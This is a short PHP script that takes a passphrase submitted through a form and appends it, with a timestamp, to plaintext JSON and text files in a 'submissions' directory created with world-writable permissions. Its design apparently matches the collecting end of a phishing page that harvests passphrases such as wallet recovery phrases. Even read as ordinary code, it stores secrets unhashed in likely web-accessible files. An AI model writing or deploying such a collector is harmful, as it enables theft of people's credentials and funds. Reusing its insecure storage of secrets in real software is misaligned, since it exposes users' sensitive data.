<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the submitted passphrase
    $passphrase = trim($_POST['mf-text']);

    // Check if the passphrase is not empty
    if (empty($passphrase)) {
        echo "Passphrase cannot be empty.";
        exit;
    }

    // Define the file path and name
    $filePath = 'submissions/';
    $fileName = 'passphrases.json'; // or use 'passphrases.txt' for text format

    // Create the directory if it doesn't exist
    if (!is_dir($filePath)) {
        mkdir($filePath, 0777, true);
    }

    // Prepare the data to save
    $data = [
        'passphrase' => $passphrase,
        'timestamp' => date('Y-m-d H:i:s')
    ];

    // Save as JSON
    $jsonData = json_encode($data) . PHP_EOL;
    file_put_contents($filePath . $fileName, $jsonData, FILE_APPEND);

    // Optionally, save as plain text
    $textData = "Passphrase: " . $passphrase . " | Timestamp: " . $data['timestamp'] . PHP_EOL;
    file_put_contents($filePath . 'passphrases.txt', $textData, FILE_APPEND);

    echo "Passphrase saved successfully!";
} else {
    echo "Invalid request method.";
}

?>
